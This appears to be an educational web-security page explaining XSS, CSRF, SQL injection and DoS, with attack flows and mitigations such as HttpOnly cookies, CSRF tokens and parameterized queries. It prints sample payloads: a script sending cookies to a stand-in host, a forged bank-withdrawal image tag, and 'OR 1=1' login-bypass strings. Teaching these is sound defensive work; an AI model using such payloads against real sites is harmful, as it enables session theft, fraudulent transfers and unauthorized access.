# Attack Techniques
<!-- GFM-TOC -->
* [Attack Techniques](#attack-techniques)
    * [1. Cross-Site Scripting](#1-cross-site-scripting)
    * [2. Cross-Site Request Forgery](#2-cross-site-request-forgery)
    * [3. SQL Injection](#3-sql-injection)
    * [4. Denial-of-Service Attack](#4-denial-of-service-attack)
    * [References](#references)
<!-- GFM-TOC -->


## 1. Cross-Site Scripting

### Overview

Cross-Site Scripting (XSS) can inject code into web pages viewed by users. This code includes HTML and JavaScript.

### Attack Flow

For example, on a forum website, an attacker can post the following content:

```html
<script>location.href="//domain.com/?c=" + document.cookie</script>
```

The content may then be rendered as follows:

```html
<p><script>location.href="//domain.com/?c=" + document.cookie</script></p>
```

Another user who views a page containing this content will be redirected to domain.com and carry the Cookie from the current scope. If the forum manages user login state through cookies, the attacker can use this cookie to log in to the victim's account.

### Impact

- Steal user cookies
- Forge fake input forms to obtain personal information
- Display fake articles or images

### Mitigation

#### 1. Set Cookie to HttpOnly

Cookies with HttpOnly set cannot be accessed by JavaScript scripts, so user cookie information cannot be obtained through document.cookie.

#### 2. Filter Special Characters

For example, escape `<` as `&lt;` and `>` as `&gt;` to prevent HTML and JavaScript code from running.

Rich text editors allow users to enter HTML code, so characters such as `<` cannot simply be filtered, which greatly increases the possibility of XSS attacks.

Rich text editors usually use an XSS filter to defend against XSS attacks. They define tag allowlists or blocklists to prevent malicious HTML code from being entered.

In the following example, tags such as form and script are escaped, while tags such as h and p are preserved.

```html
<h1 id="title">XSS Demo</h1>

<p>123</p>

<form>
  <input type="text" name="q" value="test">
</form>

<pre>hello</pre>

<script type="text/javascript">
alert(/xss/);
</script>
```

```html
<h1>XSS Demo</h1>

<p>123</p>

&lt;form&gt;
  &lt;input type="text" name="q" value="test"&gt;
&lt;/form&gt;

<pre>hello</pre>

&lt;script type="text/javascript"&gt;
alert(/xss/);
&lt;/script&gt;
```

> [Online XSS Filter Test](http://jsxss.com/zh/try.html)

## 2. Cross-Site Request Forgery

### Overview

Cross-Site Request Forgery (CSRF) is an attack where an attacker uses technical means to trick a user's browser into visiting a website where the user has previously authenticated and performing actions, such as sending emails, sending messages, or even financial operations such as transfers and purchases. Because the browser has already authenticated, the visited website treats the request as a real user operation and executes it.

XSS exploits the user's trust in a specific website, while CSRF exploits the website's trust in the user's browser.

### Attack Flow

Suppose a bank uses the following URL to perform a transfer:

```
http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName。
```

Then a malicious attacker can place the following code on another website:

```
<img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman">。
```

If a user named Alice visits the malicious site, and she has recently visited the bank so her login information has not expired, she will lose 1000 dollars.

This malicious URL can take many forms and be hidden in many places on a web page. In addition, the attacker does not need to control the website where the malicious URL is placed. For example, the attacker can hide this address in forums, blogs, or any user-generated content site. This means that if the server side has no proper defense, users may be attacked even when visiting familiar and trusted websites.

The example shows that attackers cannot directly gain control of the user's account through CSRF, nor can they directly steal any user information. What they can do is trick the user's browser into performing operations in the user's name.

### Mitigation

#### 1. Check the Referer Header

The Referer header field is in the HTTP message and identifies the source address of the request. Checking this header field and requiring the request source to be under the same domain can greatly prevent CSRF attacks.

This method is simple and easy, with low implementation effort. It only requires adding one validation step at critical access points. However, it also has limitations because it completely depends on the browser sending the correct Referer field. Although the HTTP protocol clearly specifies the content of this field, it cannot guarantee the implementation details of visiting browsers or guarantee that browser security vulnerabilities will not affect this field. Attackers may also attack certain browsers and tamper with their Referer fields.

#### 2. Add Verification Token

When accessing sensitive data, require the user's browser to provide validation data that is not stored in a cookie and cannot be forged by an attacker. For example, the server can generate a random number, attach it to the form, and require the client to send it back.

#### 3. Enter CAPTCHA

Because CSRF attacks occur without the user's awareness, requiring a CAPTCHA lets the user know that they are performing an operation.

## 3. SQL Injection

### Overview

The database on the server runs illegal SQL statements, usually caused by string concatenation.

### Attack Flow

For example, the SQL query code for login validation on a website is:

```sql
strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');"
```

If the following content is entered:

```sql
userName = "1' OR '1'='1";
passWord = "1' OR '1'='1";
```

Then the SQL query string becomes:

```sql
strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"
```

At this point, the following query can be executed without passing authentication:

```sql
strSQL = "SELECT * FROM users;"
```

### Mitigation

#### 1. Use Parameterized Queries

PreparedStatement in Java is a precompiled SQL statement. Appropriate parameters can be passed in and the statement can be executed multiple times. Because there is no concatenation process, it can prevent SQL injection.

```java
PreparedStatement stmt = connection.prepareStatement("SELECT * FROM users WHERE userid=? AND password=?");
stmt.setString(1, userid);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();
```

#### 2. Single Quote Escaping

Convert single quotes in incoming parameters into two consecutive single quotes. Magic quote in PHP can perform this function.

## 4. Denial-of-Service Attack

A Denial-of-Service attack (DoS), also called a flood attack, aims to exhaust the target computer's network or system resources, causing the service to be temporarily interrupted or stopped and preventing normal users from accessing it.

A Distributed Denial-of-Service attack (DDoS) means that an attacker uses two or more compromised computers as bots to launch a denial-of-service attack against a specific target.

## References

- [Wikipedia: Cross-Site Scripting](https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC)
- [Wikipedia: SQL Injection](https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A)
- [Wikipedia: Cross-Site Request Forgery](https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)
- [Wikipedia: Denial-of-Service Attack](https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A)
